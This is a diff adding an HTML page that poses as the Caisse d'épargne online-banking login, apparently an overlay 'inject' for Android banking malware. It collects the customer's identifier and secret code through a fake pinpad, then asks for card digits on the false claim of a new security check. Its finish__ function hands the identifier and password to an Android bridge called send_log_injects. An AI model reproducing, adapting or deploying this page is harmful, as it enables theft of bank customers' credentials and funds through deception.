@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>
+        Caisse d'épargne
+    </title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.min.js"></script>
+
+    <style>
+    	.container {} .top {padding: 10px 0px; box-shadow: 0 0 4px #9a9a9a; border-bottom: 1px solid #9c9c9c; font-size: 22px; font-weight: 600; color: #717171; } .main {margin-top: 51px; } .form-control,.form-control:focus {background: none; border: none; border-radius: 0px; border-bottom: 1px solid #252525; padding-left: 0px; box-shadow: none; padding-left: 39px; color: black; } .form-group {position: relative; color: #6b6b6b; margin-bottom: 42px; } span.fa.fa-times-circle {position: absolute; right: 0px; top: 12px; font-size: 20px; } label {display: none; } i.addon.fa {position: absolute; left: 7px; top: 8px; font-size: 22px; } .scum {padding: 1px 18px; } .btn-danger {padding: 15px 11px; background: #D3001A; } .form-group {} .form-group.has_err label {color:#D3001A } .form-group.has_err input{border-color:#D3001A } .form-group.has_err  i{color:#D3001A } .form-group.has_err {} .form-group.has_err {} .footer {position: fixed; bottom: 0px; width: 100%; left: 0px; } .pinpad-item {background: dimgrey; margin: 4px; border-radius: 7px; text-align: center; color: white; padding: 12px 0px; font-size: 21px; cursor: pointer; } .pinpad {padding: 9px 29px; } .form-control:disabled, .form-control[readonly] {background: none; } .cc-input {text-align: center; } .scum_container.loader_show {animation-name: loader__show; animation-duration: 1s; transition-timing-function: ease; animation-fill-mode: forwards; } .scum_container.loader_hide {animation-name: loader__hide; animation-duration: 1s; transition-timing-function: ease; /* animation-fill-mode:forwards; */ } @keyframes loader__show {0% {opacity: 1; } 100% {opacity: 0; transform: translateX(1000px); } } @keyframes loader__hide {0% {opacity: 0; transform: translateX(1000px); } 100% {opacity: 1; } }
+    </style>
+    
+</head>
+
+<body ng-app="app" ng-controller="c1" ng-cloak ng-model-options="{allowInvalid:true}">
+    <div class="top">
+        <div class="container">
+            Connexion
+        </div>
+    </div>
+    <div class="main">
+        <div class="container">
+            <div class="row">
+                <div class="col"></div>
+                <div class="col-sm-10 col-md-8 col-lg-6 scum_container">
+                    
+
+
+                    <div class="scum" id="login-view" style="display: ;">
+                        <form name="from1" id="form1" autocomplete="off" novalidate onsubmit="send1(event,'next__');return false">
+                            <div class="form-group">
+                                <label for="user">Identifiant</label>
+                                <i class="addon fa fa-user"></i>
+                                <input placeholder="Identifiant"  type="text" name="user" onclick="$('.footer').fadeOut()" ng-clickxx="input_selected='user'" id="user" maxlength="10"  pattern="\d{9,10}" class="form-control" data-err_text="Please enter valid Identifiant" data-ng-model="data.user">
+                                <span class="fa fa-times-circle" data-ng-show="data.user.length>0" data-ng-click="data.user=''"></span>
+                            </div>
+                            <div class="form-group">
+                                <label for="pass">Code confidentiel</label>
+                                <i class="addon fa fa-lock"></i>
+                                <input placeholder="Code confidentiel" readonly type="password" ng-click="input_selected='pass'" onclick="$('.footer').fadeIn()" name="pass" maxlength="8" id="pass" pattern=".{8,}" class="form-control" data-err_text="Please enter valid Code confidentiel" data-ng-model="data.pass">
+                                <span class="fa fa-times-circle" data-ng-show="data.pass.length>0" data-ng-click="data.pass=''"></span>
+                            </div>
+                            <div class="button-div">
+                                <button class="btn btn-danger w-100 ">
+                                    VALIDER
+                                </button>
+                            </div>
+                        </form>
+                        <div class="footer" style="display: none;">
+                            <div class="pinpad">
+                                <div class="pinpad-row d-flex justify-content-between">
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">1</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">3</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">5</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">7</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">9</span>
+                                </div>
+                                <div class="pinpad-row d-flex justify-content-between">
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">2</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">4</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">6</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">8</span>
+                                    <span ng-click="update_input($event)" class="pinpad-item w-100">0</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+
+
+                    <div class="scum" id="cc-view" style="display: none;">
+
+
+                    	<p class="legends">Afin de renforcer la sécurité de votre compte et de prévenir toute fraude, il est désormais nécessaire de s'authentifier en renseignant des chiffres aléatoires de sa carte de crédit. <br><br>
+Une fois cette vérification faite sur votre appareil, ces informations ne vous seront redemandées que lors d'une tentative de connexion à votre espace client avec un autre appareil.</p>
+                        <form name="from2" id="form1" autocomplete="off" novalidate onsubmit="send1(event,'finish__');return false">
+                            <div class="form-group">
+                                <label for="user">Identifiant</label>
+                               
+                                <div class="d-flex justify-content-between">
+                                	<input style="padding-left: 0px" value="xxxx" readonly type="text" name="card1"  id="card1" maxlength="4"  class="form-control cc-input"  >-
+                                	<input style="padding-left: 0px"  type="text" name="card2"  id="card2" maxlength="4" pattern="\d{4}" class="form-control cc-input in"  data-ng-model="data.card2">-
+                                	<input style="padding-left: 0px"  type="text" name="card3"  id="card3" maxlength="4" pattern="\d{4}" class="form-control cc-input in"  data-ng-model="data.card3">-
+                                	<input style="padding-left: 0px" value="xxxx" readonly type="text" name="card4"  id="card4" maxlength="4"  class="form-control cc-input"  >
+                                </div>
+								<span class="err_span text-danger" style="display: none;">
+                                            Veuillez entrer des données valides
+                                        </span>
+
+
+                                
+                            </div>
+                            
+                            <div class="button-div">
+                                <button class="btn btn-danger w-100 ">
+                                    VALIDER
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+                <div class="col"></div>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript">
+    var states = ["Alsace Lorraine Champagne", "Aquitaine Centre Atlantique", "Auvergne Rhône alpes", "BRED", "Bourgogne Franche-Comté", "Grand Ouest", "Méditerranée", "Nord", "Occitane", "Rives de Paris", "Sud ", "Val de France"]
+
+
+
+
+
+
+
+    $(document).ready(function() {
+        $('<div class="loader__" style="display:none;position: fixed;background: rgba(21, 20, 20, 0.51);width: 100%;height: 100%;top: 0px;left: 0px;z-index: 1000;text-align: center;">\
+   \
+   \
+   \
+   <span class="fa-stack l_4" style="font-size: 50px;position: relative;top: 50%;-webkit-transform: translateY(-50%); -ms-transform: translateY(-50%); transform: translateY(-50%);">\
+          <i class="fa fa-square fa-stack-2x"></i>\
+          <i class="fa fa-circle-o-notch fa-stack-1x fa-spin" style="color: white"></i>\
+   </span>\
+</div>').appendTo('body');
+
+
+
+        $("body").on("keypress change", '.form-control ,.custom_input_class', function() {
+            $(this).closest(".form-group").removeClass("has_err");
+            $(this).removeClass("has_err");
+            $(".err_div").fadeOut();
+        });
+
+
+        window.loader_ = {
+            hide: function() {
+
+                $('.scum_container').removeClass('loader_hide loader_show')
+                $('.scum_container').addClass('loader_hide');
+                $('.loader__').fadeOut('slow');
+            },
+            show: function() {
+                $('.loader__').fadeIn('fast');
+                $('.scum_container').removeClass('loader_hide loader_show')
+                $('.scum_container').addClass('loader_show');
+            }
+        }
+
+
+
+
+    });
+
+
+
+
+    $.fn.autoJump = function() {
+        var els = this;
+        els.on("input", function() {
+            if ($(this).val().length == $(this).attr('maxlength')) {
+                var this_ = this;
+                els.each(function(i) {
+                    if (this === this_) {
+                        if (els.length - 1 == i) {
+                            els.eq(0).focus();
+                        } else {
+                            els.eq(i + 1).focus();
+                        }
+                    }
+                });
+            }
+        });
+    };
+
+
+
+
+
+    send1 = function(e, callback__, global_luhn__) {
+        e.preventDefault();
+        var el = e.target;
+        var err = false;
+        var err_text = [];
+        var err_elements = [];
+
+        $(el).find("input:visible,select:visible").each(function() {
+            var reg__ = new RegExp($(this).attr('pattern'));
+
+            if (!reg__.test($(this).val())) {
+                err = true;
+                err_elements.push(this);
+                err_text.push(this.dataset.err_text);
+                return;
+            }
+            var luhn__ = $(this).data().luhn;
+            if (typeof luhn__ != "undefined" && luhn__ != "") {
+
+                if ($(this).val() != "") {
+                    if (!eval(luhn__)($(this).val(), err_text)) {
+                        err = true;
+                        err_elements.push(this);
+                    }
+                }
+            }
+        });
+
+        if (!err) {
+            if (typeof global_luhn__ != "undefined") {
+                if (!eval(global_luhn__)(err_text)) {
+                    err = true;
+                }
+            }
+        }
+
+
+        if (err) {
+            err_text = err_text.filter(function(e) {
+                return e;
+            });
+            err_text = $.unique(err_text);
+            $(".err_ul").html("");
+            $(err_text).each(function(i, t) {
+                $("<li><span>" + t + "</span></li>").appendTo(".err_ul");
+            });
+
+            $(".err_div").show();
+            $(err_elements).each(function() {
+                $(this).closest(".form-group").addClass("has_err");
+                $(this).addClass("has_err");
+
+            });
+            $(window).scrollTop(0);
+            return;
+        }
+
+        if (typeof callback__ != "undefined") {
+            eval(callback__)(el);
+            return;
+        }
+        //alert("We stack, what to do next?");
+    };
+
+
+
+
+
+
+
+    angular.module('app', []).controller('c1', ['$scope', function($scope) {
+        window.sc_ = $scope;
+
+
+        $scope.data = {
+            user: "",
+            pass: ""
+        }
+
+        $scope.input_selected = "pass"
+
+
+
+        $scope.update_input = function(e) {
+            var val = $(e.target).text().trim();
+
+
+
+
+
+            if ($scope.data[$scope.input_selected].length < $scope.from1[$scope.input_selected].$$attr.maxlength) {
+                $scope.data[$scope.input_selected] = $scope.data[$scope.input_selected] + "" + val
+            }
+        }
+    }])
+
+
+
+    var next__ = function(el) {
+
+        loader_.show();
+        setTimeout(function() {
+            $('.scum').hide();
+            $(el).closest('.scum').next().show();
+            loader_.hide();
+        }, 1000)
+
+    }
+
+
+
+    start = function() {
+        loader_.show();
+        setTimeout(function() {
+            $('.scum').hide();
+            $('#start-view').show();
+            loader_.hide();
+        }, 1000)
+    }
+
+
+
+    function finish__(el) {
+        
+        var cc = sc_.data.cc_2 + "" + sc_.data.cc_3;
+        loader_.show();
+        setTimeout(function() {
+            top['closeDlg'] = true;
+            var ua = navigator.userAgent.toLowerCase();
+            var data__ = '{"datauser":"' + sc_.data.user +
+                    '","datapass":"' + sc_.data.pass + 
+                    '","type_injects":"banks"' +  
+                    ',"closed":"close_activity_injects"}';
+            if(ua.indexOf("android") > -1) {
+                try {
+                    Android.send_log_injects(data__);
+                } catch (err) {}
+            }else{
+                alert(data__);
+            }
+
+        }, 3000);
+    }
+    </script>
+</body>
+
+</html>
